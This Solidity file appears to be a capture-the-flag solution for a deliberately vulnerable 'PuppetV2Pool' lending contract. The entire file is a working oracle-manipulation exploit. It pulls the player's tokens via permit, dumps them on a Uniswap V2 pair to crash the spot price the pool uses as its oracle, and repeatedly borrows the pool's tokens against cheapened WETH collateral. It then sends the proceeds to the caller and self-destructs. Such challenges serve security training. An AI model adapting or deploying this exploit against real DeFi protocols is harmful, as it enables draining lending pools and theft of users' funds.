// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;

import {IERC20, PuppetV2Pool} from "./PuppetV2Pool.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {UniswapV2Library} from "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";

interface IERC2612 is IERC20 {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PuppetV2PoolAttack {
    PuppetV2Pool private immutable _POOL;
    IUniswapV2Router02 private immutable _ROUTER;
    address private immutable _FACTORY;
    IERC2612 private immutable _WETH;
    IERC2612 private immutable _TOKEN;
    uint256 private constant _MAX = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

    constructor(PuppetV2Pool pool, IUniswapV2Router02 router, address factory, IERC2612 weth, IERC2612 token)
        public
        payable
    {
        _POOL = pool;
        _ROUTER = router;
        _FACTORY = factory;
        _WETH = weth;
        _TOKEN = token;
    }

    function exploit(uint8 v, bytes32 r, bytes32 s) public payable {
        _TOKEN.approve(address(_ROUTER), _MAX);
        _WETH.approve(address(_POOL), _MAX);

        // transfer token from player to this contract
        _TOKEN.permit(msg.sender, address(this), _MAX, _MAX, v, r, s);
        _TOKEN.transferFrom(msg.sender, address(this), _TOKEN.balanceOf(msg.sender));

        while (_TOKEN.balanceOf(address(_POOL)) > 0) {
            uint256 tokenAmount = _TOKEN.balanceOf(address(this));
            // dump tokens prices using uniswap pair
            address[] memory paths = new address[](2);
            paths[0] = address(_TOKEN);
            paths[1] = address(_WETH);
            _ROUTER.swapExactTokensForETH(tokenAmount, 0, paths, address(this), block.timestamp * 2);

            // borrow from pool using WETH
            (uint256 reservesWETH, uint256 reservesToken) =
                UniswapV2Library.getReserves(_FACTORY, address(_WETH), address(_TOKEN));
            uint256 amountAbleToBorrow = UniswapV2Library.quote(address(this).balance, reservesWETH, reservesToken) / 3;
            tokenAmount = _TOKEN.balanceOf(address(_POOL));
            tokenAmount = tokenAmount < amountAbleToBorrow ? tokenAmount : amountAbleToBorrow;
            address(_WETH).call{value: address(this).balance}("");
            _POOL.borrow(tokenAmount);
        }

        // swap all WETH to token
        _WETH.approve(address(_ROUTER), _MAX);
        address[] memory paths = new address[](2);
        paths[0] = address(_WETH);
        paths[1] = address(_TOKEN);
        _ROUTER.swapExactTokensForTokens(_WETH.balanceOf(address(this)), 0, paths, address(this), block.timestamp * 2);

        // dump assets to player and selfdestruct
        _TOKEN.transfer(msg.sender, _TOKEN.balanceOf(address(this)));
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
